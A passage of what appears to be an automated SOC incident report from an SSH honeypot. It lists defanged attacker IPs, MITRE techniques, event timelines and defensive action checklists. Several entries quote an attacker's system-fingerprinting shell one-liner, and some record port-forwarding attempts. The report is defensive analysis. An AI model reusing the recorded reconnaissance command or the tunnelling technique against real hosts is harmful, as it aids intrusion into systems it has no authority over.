- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84c6468f9abe

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-15 07:20 |
| **Last Seen** | 2026-07-15 07:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:20:42` | `cowrie.session.connect` |
| `2026-07-15 07:20:42` | `cowrie.client.version` |
| `2026-07-15 07:20:42` | `cowrie.client.kex` |
| `2026-07-15 07:20:45` | `cowrie.login.success` |
| `2026-07-15 07:20:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14e3ef55bb26

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:21 |
| **Last Seen** | 2026-07-15 07:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:21:09` | `cowrie.session.connect` |
| `2026-07-15 07:21:09` | `cowrie.client.version` |
| `2026-07-15 07:21:09` | `cowrie.client.kex` |
| `2026-07-15 07:21:11` | `cowrie.login.success` |
| `2026-07-15 07:21:13` | `cowrie.session.params` |
| `2026-07-15 07:21:13` | `cowrie.command.input` |
| `2026-07-15 07:21:13` | `cowrie.command.input` |
| `2026-07-15 07:21:13` | `cowrie.command.input` |
| `2026-07-15 07:21:13` | `cowrie.command.input` |
| `2026-07-15 07:21:13` | `cowrie.command.input` |
| `2026-07-15 07:21:13` | `cowrie.command.success` |
| `2026-07-15 07:21:13` | `cowrie.command.input` |
| `2026-07-15 07:21:13` | `cowrie.command.input` |
| `2026-07-15 07:21:13` | `cowrie.command.input` |
| `2026-07-15 07:21:13` | `cowrie.command.input` |
| `2026-07-15 07:21:14` | `cowrie.log.closed` |
| `2026-07-15 07:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-945d3eca99a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:22 |
| **Last Seen** | 2026-07-15 07:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:22:34` | `cowrie.session.connect` |
| `2026-07-15 07:22:34` | `cowrie.client.version` |
| `2026-07-15 07:22:34` | `cowrie.client.kex` |
| `2026-07-15 07:22:35` | `cowrie.login.success` |
| `2026-07-15 07:22:37` | `cowrie.session.params` |
| `2026-07-15 07:22:37` | `cowrie.command.input` |
| `2026-07-15 07:22:37` | `cowrie.command.input` |
| `2026-07-15 07:22:37` | `cowrie.command.input` |
| `2026-07-15 07:22:37` | `cowrie.command.input` |
| `2026-07-15 07:22:37` | `cowrie.command.input` |
| `2026-07-15 07:22:37` | `cowrie.command.success` |
| `2026-07-15 07:22:37` | `cowrie.command.input` |
| `2026-07-15 07:22:37` | `cowrie.command.input` |
| `2026-07-15 07:22:37` | `cowrie.command.input` |
| `2026-07-15 07:22:37` | `cowrie.command.input` |
| `2026-07-15 07:22:37` | `cowrie.log.closed` |
| `2026-07-15 07:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a878d387a7e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:24 |
| **Last Seen** | 2026-07-15 07:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:24:09` | `cowrie.session.connect` |
| `2026-07-15 07:24:09` | `cowrie.client.version` |
| `2026-07-15 07:24:09` | `cowrie.client.kex` |
| `2026-07-15 07:24:12` | `cowrie.login.success` |
| `2026-07-15 07:24:14` | `cowrie.session.params` |
| `2026-07-15 07:24:14` | `cowrie.command.input` |
| `2026-07-15 07:24:14` | `cowrie.command.input` |
| `2026-07-15 07:24:14` | `cowrie.command.input` |
| `2026-07-15 07:24:14` | `cowrie.command.input` |
| `2026-07-15 07:24:14` | `cowrie.command.input` |
| `2026-07-15 07:24:14` | `cowrie.command.success` |
| `2026-07-15 07:24:14` | `cowrie.command.input` |
| `2026-07-15 07:24:14` | `cowrie.command.input` |
| `2026-07-15 07:24:14` | `cowrie.command.input` |
| `2026-07-15 07:24:14` | `cowrie.command.input` |
| `2026-07-15 07:24:15` | `cowrie.log.closed` |
| `2026-07-15 07:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8673b35af8b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:25 |
| **Last Seen** | 2026-07-15 07:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:25:30` | `cowrie.session.connect` |
| `2026-07-15 07:25:31` | `cowrie.client.version` |
| `2026-07-15 07:25:31` | `cowrie.client.kex` |
| `2026-07-15 07:25:33` | `cowrie.login.success` |
| `2026-07-15 07:25:35` | `cowrie.session.params` |
| `2026-07-15 07:25:35` | `cowrie.command.input` |
| `2026-07-15 07:25:35` | `cowrie.command.input` |
| `2026-07-15 07:25:35` | `cowrie.command.input` |
| `2026-07-15 07:25:35` | `cowrie.command.input` |
| `2026-07-15 07:25:35` | `cowrie.command.input` |
| `2026-07-15 07:25:35` | `cowrie.command.success` |
| `2026-07-15 07:25:35` | `cowrie.command.input` |
| `2026-07-15 07:25:35` | `cowrie.command.input` |
| `2026-07-15 07:25:35` | `cowrie.command.input` |
| `2026-07-15 07:25:35` | `cowrie.command.input` |
| `2026-07-15 07:25:36` | `cowrie.log.closed` |
| `2026-07-15 07:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-308885a20920

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:26 |
| **Last Seen** | 2026-07-15 07:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:26:45` | `cowrie.session.connect` |
| `2026-07-15 07:26:45` | `cowrie.client.version` |
| `2026-07-15 07:26:45` | `cowrie.client.kex` |
| `2026-07-15 07:26:47` | `cowrie.login.success` |
| `2026-07-15 07:26:48` | `cowrie.session.params` |
| `2026-07-15 07:26:48` | `cowrie.command.input` |
| `2026-07-15 07:26:48` | `cowrie.command.input` |
| `2026-07-15 07:26:48` | `cowrie.command.input` |
| `2026-07-15 07:26:48` | `cowrie.command.input` |
| `2026-07-15 07:26:48` | `cowrie.command.input` |
| `2026-07-15 07:26:48` | `cowrie.command.success` |
| `2026-07-15 07:26:48` | `cowrie.command.input` |
| `2026-07-15 07:26:48` | `cowrie.command.input` |
| `2026-07-15 07:26:48` | `cowrie.command.input` |
| `2026-07-15 07:26:48` | `cowrie.command.input` |
| `2026-07-15 07:26:49` | `cowrie.log.closed` |
| `2026-07-15 07:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fd814d26794

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]128` |
| **First Seen** | 2026-07-15 07:27 |
| **Last Seen** | 2026-07-15 07:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:27:37` | `cowrie.session.connect` |
| `2026-07-15 07:27:37` | `cowrie.client.version` |
| `2026-07-15 07:27:37` | `cowrie.client.kex` |
| `2026-07-15 07:27:39` | `cowrie.login.success` |
| `2026-07-15 07:27:39` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]128` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e513309f100

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:28 |
| **Last Seen** | 2026-07-15 07:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:28:00` | `cowrie.session.connect` |
| `2026-07-15 07:28:01` | `cowrie.client.version` |
| `2026-07-15 07:28:01` | `cowrie.client.kex` |
| `2026-07-15 07:28:03` | `cowrie.login.success` |
| `2026-07-15 07:28:05` | `cowrie.session.params` |
| `2026-07-15 07:28:05` | `cowrie.command.input` |
| `2026-07-15 07:28:05` | `cowrie.command.input` |
| `2026-07-15 07:28:05` | `cowrie.command.input` |
| `2026-07-15 07:28:05` | `cowrie.command.input` |
| `2026-07-15 07:28:05` | `cowrie.command.input` |
| `2026-07-15 07:28:05` | `cowrie.command.success` |
| `2026-07-15 07:28:05` | `cowrie.command.input` |
| `2026-07-15 07:28:05` | `cowrie.command.input` |
| `2026-07-15 07:28:05` | `cowrie.command.input` |
| `2026-07-15 07:28:05` | `cowrie.command.input` |
| `2026-07-15 07:28:06` | `cowrie.log.closed` |
| `2026-07-15 07:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beac801aecc9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:29 |
| **Last Seen** | 2026-07-15 07:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:29:24` | `cowrie.session.connect` |
| `2026-07-15 07:29:25` | `cowrie.client.version` |
| `2026-07-15 07:29:25` | `cowrie.client.kex` |
| `2026-07-15 07:29:27` | `cowrie.login.success` |
| `2026-07-15 07:29:29` | `cowrie.session.params` |
| `2026-07-15 07:29:29` | `cowrie.command.input` |
| `2026-07-15 07:29:29` | `cowrie.command.input` |
| `2026-07-15 07:29:29` | `cowrie.command.input` |
| `2026-07-15 07:29:29` | `cowrie.command.input` |
| `2026-07-15 07:29:29` | `cowrie.command.input` |
| `2026-07-15 07:29:29` | `cowrie.command.success` |
| `2026-07-15 07:29:29` | `cowrie.command.input` |
| `2026-07-15 07:29:29` | `cowrie.command.input` |
| `2026-07-15 07:29:29` | `cowrie.command.input` |
| `2026-07-15 07:29:29` | `cowrie.command.input` |
| `2026-07-15 07:29:29` | `cowrie.log.closed` |
| `2026-07-15 07:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f385557bddf8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:30 |
| **Last Seen** | 2026-07-15 07:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:30:25` | `cowrie.session.connect` |
| `2026-07-15 07:30:25` | `cowrie.client.version` |
| `2026-07-15 07:30:25` | `cowrie.client.kex` |
| `2026-07-15 07:30:27` | `cowrie.login.success` |
| `2026-07-15 07:30:29` | `cowrie.session.params` |
| `2026-07-15 07:30:29` | `cowrie.command.input` |
| `2026-07-15 07:30:29` | `cowrie.command.input` |
| `2026-07-15 07:30:29` | `cowrie.command.input` |
| `2026-07-15 07:30:29` | `cowrie.command.input` |
| `2026-07-15 07:30:29` | `cowrie.command.input` |
| `2026-07-15 07:30:29` | `cowrie.command.success` |
| `2026-07-15 07:30:29` | `cowrie.command.input` |
| `2026-07-15 07:30:29` | `cowrie.command.input` |
| `2026-07-15 07:30:29` | `cowrie.command.input` |
| `2026-07-15 07:30:29` | `cowrie.command.input` |
| `2026-07-15 07:30:29` | `cowrie.log.closed` |
| `2026-07-15 07:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab504c31cf5e

| Field | Detail |
|---|---|
| **Source IP** | `183.82.108[.]109` |
| **First Seen** | 2026-07-15 07:30 |
| **Last Seen** | 2026-07-15 07:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:30:25` | `cowrie.session.connect` |
| `2026-07-15 07:30:26` | `cowrie.client.version` |
| `2026-07-15 07:30:26` | `cowrie.client.kex` |
| `2026-07-15 07:30:28` | `cowrie.login.success` |
| `2026-07-15 07:30:29` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:30:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.108[.]109` to AbuseIPDB if not already reported
- [ ] Block `183.82.108[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6499bf339fe4

| Field | Detail |
|---|---|
| **Source IP** | `50.217.255[.]171` |
| **First Seen** | 2026-07-15 07:30 |
| **Last Seen** | 2026-07-15 07:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:30:28` | `cowrie.session.connect` |
| `2026-07-15 07:30:29` | `cowrie.client.version` |
| `2026-07-15 07:30:29` | `cowrie.client.kex` |
| `2026-07-15 07:30:30` | `cowrie.login.success` |
| `2026-07-15 07:30:31` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.255[.]171` to AbuseIPDB if not already reported
- [ ] Block `50.217.255[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9a62e4cf12d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:31 |
| **Last Seen** | 2026-07-15 07:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:31:25` | `cowrie.session.connect` |
| `2026-07-15 07:31:25` | `cowrie.client.version` |
| `2026-07-15 07:31:25` | `cowrie.client.kex` |
| `2026-07-15 07:31:28` | `cowrie.login.success` |
| `2026-07-15 07:31:30` | `cowrie.session.params` |
| `2026-07-15 07:31:30` | `cowrie.command.input` |
| `2026-07-15 07:31:30` | `cowrie.command.input` |
| `2026-07-15 07:31:30` | `cowrie.command.input` |
| `2026-07-15 07:31:30` | `cowrie.command.input` |
| `2026-07-15 07:31:30` | `cowrie.command.input` |
| `2026-07-15 07:31:30` | `cowrie.command.success` |
| `2026-07-15 07:31:30` | `cowrie.command.input` |
| `2026-07-15 07:31:30` | `cowrie.command.input` |
| `2026-07-15 07:31:30` | `cowrie.command.input` |
| `2026-07-15 07:31:30` | `cowrie.command.input` |
| `2026-07-15 07:31:31` | `cowrie.log.closed` |
| `2026-07-15 07:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca34cf4c99cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:32 |
| **Last Seen** | 2026-07-15 07:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:32:27` | `cowrie.session.connect` |
| `2026-07-15 07:32:27` | `cowrie.client.version` |
| `2026-07-15 07:32:27` | `cowrie.client.kex` |
| `2026-07-15 07:32:31` | `cowrie.login.success` |
| `2026-07-15 07:32:33` | `cowrie.session.params` |
| `2026-07-15 07:32:33` | `cowrie.command.input` |
| `2026-07-15 07:32:33` | `cowrie.command.input` |
| `2026-07-15 07:32:33` | `cowrie.command.input` |
| `2026-07-15 07:32:33` | `cowrie.command.input` |
| `2026-07-15 07:32:33` | `cowrie.command.input` |
| `2026-07-15 07:32:33` | `cowrie.command.success` |
| `2026-07-15 07:32:33` | `cowrie.command.input` |
| `2026-07-15 07:32:33` | `cowrie.command.input` |
| `2026-07-15 07:32:33` | `cowrie.command.input` |
| `2026-07-15 07:32:33` | `cowrie.command.input` |
| `2026-07-15 07:32:34` | `cowrie.log.closed` |
| `2026-07-15 07:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1739861c472c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:33 |
| **Last Seen** | 2026-07-15 07:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
